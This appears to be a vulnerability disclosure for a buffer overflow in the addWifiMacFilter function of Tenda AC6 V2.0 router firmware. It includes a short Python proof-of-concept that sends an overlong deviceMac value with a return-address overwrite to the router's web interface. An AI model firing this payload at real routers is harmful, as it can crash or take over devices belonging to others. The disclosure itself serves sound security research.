# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "addWifiMacFilter"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the `addWifiMacFilter` function, the parameters **deviceID** and **deviceMac** are read into `device_id` and `device_mac` respectively using `websGetVar`. These inputs are then passed to `sprintf(mib_value, "%s;%d;%s", device_mac, 1, device_id);` without prior validation. Since **mib_value** is only 256 bytes in size, providing an overly long **deviceID** or **deviceMac** can directly cause a **buffer overflow**.

![image-20250614175044050](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614175044050.png)

poc

```
import requests
def send_payload(url, id,mac):
    params = {'deviceId': id,'deviceMac': mac}
    response = requests.get(url, params=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
url="http://192.168.1.1/goform/addWifiMacFilter"
id=""
mac=b'a'*0x2048+b"\xef\xbe\xad\xde"
send_payload(url, id, mac)
```

![image-20250614175617189](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614175617189.png)